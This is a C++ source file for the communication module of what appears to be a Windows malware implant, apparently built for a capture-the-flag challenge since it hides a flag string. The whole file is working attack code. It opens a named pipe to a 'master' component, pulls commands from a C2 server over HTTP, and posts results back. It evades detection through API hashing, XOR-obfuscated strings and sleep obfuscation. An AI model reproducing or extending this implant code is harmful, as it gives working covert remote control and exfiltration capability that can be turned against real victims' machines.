// COM Shellcode - Manages HTTP communication with C2 server
// Waits for master to signal ready, makes HTTP requests, relays responses

#include "api_hashing.hpp"
#include "config_type.hpp"
#include "memory.hpp"
#include "obfuscated_string.hpp"
#include "pipe_protocol.hpp"
#include "sleep_obfuscation.hpp"
#include "shellcode_config.hpp"
#include "http_com.hpp"

// Debug file helper - write state to C:\Users\root\com_debug.txt
void write_com_debug_state(const char* state, void* kernel32) {
    typedef HANDLE (WINAPI* fnCreateFileA)(const char*, uint32_t, uint32_t, LPSECURITY_ATTRIBUTES, uint32_t, uint32_t, HANDLE);
    typedef BOOL (WINAPI* fnWriteFile)(HANDLE, const void*, uint32_t, uint32_t*, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnCloseHandle)(HANDLE);
    typedef uint32_t (WINAPI* fnSetFilePointer)(HANDLE, int32_t, int32_t*, uint32_t);

    fnCreateFileA fn_create_file = (fnCreateFileA)get_proc_address((HMODULE)kernel32, CREATEFILEA);
    fnWriteFile fn_write_file = (fnWriteFile)get_proc_address((HMODULE)kernel32, WRITEFILE);
    fnCloseHandle fn_close_handle = (fnCloseHandle)get_proc_address((HMODULE)kernel32, CLOSEHANDLE);
    fnSetFilePointer fn_set_file_pointer = (fnSetFilePointer)get_proc_address((HMODULE)kernel32, SETFILEPOINTER);

    if (!fn_create_file || !fn_write_file || !fn_close_handle) return;

    // Open/create debug file
    XOR_STR("C:\\Users\\root\\com_debug.txt", debug_file_path);
    HANDLE hFile = fn_create_file(
        debug_file_path,
        0x40000000,  // GENERIC_WRITE
        0x00000001,  // FILE_SHARE_READ
        NULL,
        4,  // OPEN_ALWAYS
        0x80,  // FILE_ATTRIBUTE_NORMAL
        NULL
    );

    if (hFile == (HANDLE)-1) return;

    // Seek to end
    if (fn_set_file_pointer) {
        fn_set_file_pointer(hFile, 0, NULL, 2);  // FILE_END
    }

    // Write state + newline
    uint32_t written = 0;
    uint32_t len = 0;
    while (state[len]) len++;

    fn_write_file(hFile, state, len, &written, NULL);
    fn_write_file(hFile, "\r\n", 2, &written, NULL);

    fn_close_handle(hFile);
}

extern "C" __attribute__((section(".text$A"))) DWORD shellcode_main(LPVOID lpParameter) {
    (void)lpParameter;
    DEBUG("=== COM Shellcode Starting ===");

    // Flag part 1 hidden in shellcode (stack string)
    volatile char flag_part_1[] = {'F','L','A','G',' ','P','A','R','T','_','1',':',' ','Y','o','U','_','l','1','K','3','_','7','h','4','\0'};
    if (flag_part_1[0] == 'X') return 0;  // Never true, but prevents optimization

    // Initialize configuration
    config_t config = {0};
    if (init_shellcode_config(&config) != 0) {
        ERROR_LOG("Failed to initialize config");
        return 1;
    }

    // Get required pipe functions
    typedef HANDLE (WINAPI* fnCreateNamedPipeA)(const char*, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, LPSECURITY_ATTRIBUTES);
    typedef BOOL (WINAPI* fnConnectNamedPipe)(HANDLE, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnDisconnectNamedPipe)(HANDLE);
    typedef BOOL (WINAPI* fnReadFile)(HANDLE, void*, uint32_t, uint32_t*, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnWriteFile)(HANDLE, const void*, uint32_t, uint32_t*, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnCloseHandle)(HANDLE);
    typedef void (WINAPI* fnExitThread)(uint32_t);
    typedef BOOL (WINAPI* fnFlushFileBuffers)(HANDLE);

    fnCreateNamedPipeA fn_create_named_pipe_a = (fnCreateNamedPipeA)get_proc_address(config.kernel32, CREATENAMEDPIPEA);
    fnConnectNamedPipe fn_connect_named_pipe = (fnConnectNamedPipe)get_proc_address(config.kernel32, CONNECTNAMEDPIPE);
    fnDisconnectNamedPipe fn_disconnect_named_pipe = (fnDisconnectNamedPipe)get_proc_address(config.kernel32, DISCONNECTNAMEDPIPE);
    fnReadFile fn_read_file = (fnReadFile)get_proc_address(config.kernel32, READFILE);
    fnWriteFile fn_write_file = (fnWriteFile)get_proc_address(config.kernel32, WRITEFILE);
    fnCloseHandle fn_close_handle = (fnCloseHandle)get_proc_address(config.kernel32, CLOSEHANDLE);
    fnExitThread fn_exit_thread = (fnExitThread)get_proc_address(config.kernel32, EXITTHREAD);
    fnFlushFileBuffers fn_flush_file_buffers = (fnFlushFileBuffers)get_proc_address(config.kernel32, FLUSHFILEBUFFERS);

    // Get CreateEventA function
    typedef HANDLE (WINAPI* fnCreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, const char*);
    fnCreateEventA fn_create_event_a = (fnCreateEventA)get_proc_address(config.kernel32, CREATEEVENTA);

    // Create event for overlapped I/O
    HANDLE connect_event = fn_create_event_a(NULL, TRUE, FALSE, NULL);  // Manual reset event
    if (!connect_event) {
        ERROR_LOG("Failed to create event");
        unload_shellcode_config(&config);
        SAFE_EXIT_THREAD(1);
    }

    // Create COM named pipe server with overlapped flag
    XOR_STR("\\\\.\\pipe\\com", pipe_name);
    DEBUG("Creating COM pipe: %s", pipe_name);

    HANDLE pipe = fn_create_named_pipe_a(
        pipe_name,
        0x00000003 | 0x40000000,  // PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
        0x00000000,  // PIPE_TYPE_BYTE | PIPE_WAIT
        1,           // Max instances
        8192,        // Out buffer size
        8192,        // In buffer size
        0,           // Default timeout
        NULL
    );

    if (pipe == (HANDLE)-1) {
        ERROR_LOG("Failed to create COM pipe");
        fn_close_handle(connect_event);
        unload_shellcode_config(&config);
        SAFE_EXIT_THREAD(1);
    }

    // Main communication loop
    while (1) {
        // Start async connection - this makes the event signaled when client connects
        OVERLAPPED overlapped = {0};
        overlapped.hEvent = connect_event;

        fn_connect_named_pipe(pipe, &overlapped);  // Start listening asynchronously

        // Sleep obfuscation - wait on event that signals when client connects
        DEBUG("Entering sleep obfuscation, waiting for connection...");
        sleep_obfuscation(&config, connect_event);

        // When we wake up, connection is established
        DEBUG("Woke from sleep obfuscation, connection established!");

        pipe_msg_header_t header;
        uint32_t read = 0;
        fn_read_file(pipe, &header, sizeof(header), &read, NULL);

        // Check for QUIT message
        if (read == sizeof(header) && header.type == PIPE_MSG_QUIT) {
            INFO("Received QUIT message, exiting...");
            fn_flush_file_buffers(pipe);
            fn_disconnect_named_pipe(pipe);
            break;  // Exit main loop
        }

        // Handle READY message - start of new command cycle
        if (read == sizeof(header) && header.type == PIPE_MSG_READY) {
            INFO_SUCCESS("Received ready signal from master");

            // Make HTTP GET request to C2 to receive command
            DEBUG("Making HTTP GET to %ws:%d%ws", config.server, config.port, config.endpoint);
            uint8_t* response_data = NULL;
            size_t response_size = 0;

            int http_result = http_com(1, &config, NULL, 0, &response_data, &response_size);  // 1 = GET

            if (http_result == 0 && response_data && response_size > 0) {
                INFO_SUCCESS("Received command from C2 (%zu bytes)", response_size);
                // Send encrypted command to master
                pipe_msg_header_t cmd_header;
                cmd_header.type = PIPE_MSG_COMMAND;
                cmd_header.size = response_size;
                DEBUG("header.type:%d,  header.size:%d", cmd_header.type, cmd_header.size);

                uint32_t written = 0;
                fn_write_file(pipe, &cmd_header, sizeof(pipe_msg_header_t), &written, NULL);
                fn_write_file(pipe, response_data, response_size, &written, NULL);
                // we don't want to be raced by the disconnect we force the master to consume data
                fn_flush_file_buffers(pipe);
                DEBUG("Sent command to master, disconnecting...");
                dealloc_mem(&config, response_data);


                // Disconnect - master will process and reconnect with response
                fn_disconnect_named_pipe(pipe);
                typedef BOOL (WINAPI* fnResetEvent)(HANDLE);
                fnResetEvent fn_reset_event = (fnResetEvent)get_proc_address(config.kernel32, RESETEVENT);
                fn_reset_event(connect_event);

                // Re-enter sleep to wait for master's response connection
                continue;
            } else {
                ERROR_LOG("Failed to get command from C2");
            }
        }
        // Handle HTTP_RESPONSE message - master sending back response to POST
        else if (read == sizeof(header) && header.type == PIPE_MSG_HTTP_RESPONSE) {
            // Received response from master (in a NEW connection)
            uint8_t* master_response = NULL;
            if (header.size > 0) {
                master_response = (uint8_t*)alloc_mem(&config, header.size);
                if (master_response) {
                    fn_read_file(pipe, master_response, header.size, &read, NULL);
                    DEBUG("Received response from master (%d bytes)", header.size);

                    // Send response back to C2 via HTTP POST
                    wchar_t* old_endpoint = config.endpoint;
                    config.endpoint = (wchar_t*)alloc_mem(&config, 64);
                    if (config.endpoint) {
                        config.endpoint[0] = L'/'; config.endpoint[1] = L'r';
                        config.endpoint[2] = L'e'; config.endpoint[3] = L's';
                        config.endpoint[4] = L'p'; config.endpoint[5] = L'o';
                        config.endpoint[6] = L'n'; config.endpoint[7] = L's';
                        config.endpoint[8] = L'e'; config.endpoint[9] = L'\0';

                        uint8_t* post_response = NULL;
                        size_t post_response_size = 0;
                        int post_result = http_com(0, &config, master_response, header.size, &post_response, &post_response_size);  // 0 = POST

                        if (post_result == 0) {
                            INFO_SUCCESS("Posted response to C2 successfully");
                        } else {
                            ERROR_LOG("Failed to POST response to C2");
                        }

                        if (post_response) {
                            dealloc_mem(&config, post_response);
                        }

                        dealloc_mem(&config, config.endpoint);
                        config.endpoint = old_endpoint;
                    }

                    dealloc_mem(&config, master_response);
                }
            } else {
                // Empty response - just POST it
                DEBUG("Received empty response from master");
                wchar_t* old_endpoint = config.endpoint;
                config.endpoint = (wchar_t*)alloc_mem(&config, 64);
                if (config.endpoint) {
                    config.endpoint[0] = L'/'; config.endpoint[1] = L'r';
                    config.endpoint[2] = L'e'; config.endpoint[3] = L's';
                    config.endpoint[4] = L'p'; config.endpoint[5] = L'o';
                    config.endpoint[6] = L'n'; config.endpoint[7] = L's';
                    config.endpoint[8] = L'e'; config.endpoint[9] = L'\0';
                    
                    uint8_t* post_response = NULL;
                    size_t post_response_size = 0;
                    http_com(0, &config, NULL, 0, &post_response, &post_response_size);  // POST empty

                    if (post_response) {
                        dealloc_mem(&config, post_response);
                    }

                    dealloc_mem(&config, config.endpoint);
                    config.endpoint = old_endpoint;
                }
            }
            INFO_SUCCESS("Response cycle complete");
        }
        // Unknown message type
        else {
            ERROR_LOG("Unexpected message type %d", header.type);
        }

        // Disconnect and reset event for next connection
        fn_flush_file_buffers(pipe);
        fn_disconnect_named_pipe(pipe);

        typedef BOOL (WINAPI* fnResetEvent)(HANDLE);
        fnResetEvent fn_reset_event = (fnResetEvent)get_proc_address(config.kernel32, RESETEVENT);
        fn_reset_event(connect_event);
    }

    fn_close_handle(pipe);
    fn_close_handle(connect_event);
    unload_shellcode_config(&config);
    SAFE_EXIT_THREAD(0);
}

#if VERBOSE >= 1
int main() {
    shellcode_main(NULL);
    return 0;
}
#endif
